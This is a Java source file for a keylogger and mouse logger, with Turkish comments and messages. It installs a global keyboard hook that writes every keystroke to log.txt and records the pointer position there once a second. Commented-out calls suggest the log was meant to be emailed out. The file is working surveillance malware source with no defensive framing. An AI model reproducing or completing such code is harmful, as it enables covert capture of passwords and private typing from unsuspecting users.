import java.awt.MouseInfo;
import java.io.FileWriter;
import java.io.IOException;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.Timer;
import java.util.TimerTask;
import java.util.logging.Level;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;




public class key_mouselogger extends Main implements NativeKeyListener {
    static int sayac = 0;
    static Timer myTimer = new Timer();
    static TimerTask gorev1;
    private static final Path file = Paths.get("log.txt");
    private static final Logger logger = LoggerFactory.getLogger(Main.class);

    public  void loggs() {
        // sendMail object = new sendMail();
        logger.info("Keylogger başlatıldı!");

        init();

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            logger.error(e.getMessage(), e);
            System.exit(-1);
        }

        GlobalScreen.addNativeKeyListener(new key_mouselogger());
        //object.sendEmail();
    }

    private static void init() {


        java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.WARNING);


        logger.setUseParentHandlers(false);
    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());

        try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
                StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {

            if (keyText.length() > 1) {
                writer.println("[" + keyText + "]\n");
            } else {
                writer.println(keyText+"\n");
            }

        } catch (IOException ex) {
            logger.error(ex.getMessage(), ex);
            System.exit(-1);
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) {

    }

    public void nativeKeyTyped(NativeKeyEvent e) {

    }
    //**************************************************************************************

    double  mouseX= 1.0;
    double  mouseY= 1.0;


    public void mouselog() {


        gorev1 = new TimerTask() {
            public void run() {

                mouseX = MouseInfo.getPointerInfo().getLocation().getX();
                mouseY = MouseInfo.getPointerInfo().getLocation().getY();


                try {
                    FileWriter myWriter = new FileWriter("log.txt", true);
                    myWriter.write("mousex:" + mouseX + "\tmouseY:" + mouseY + "\n");
                    myWriter.close();

                } catch (IOException e) {
                    System.out.println("Bir hata oluştu.");
                    e.printStackTrace();
                }


                sayac++;

                if (sayac == 0) myTimer.cancel();
            }
        };
        myTimer.schedule(gorev1, 0, 1000);



    }
}

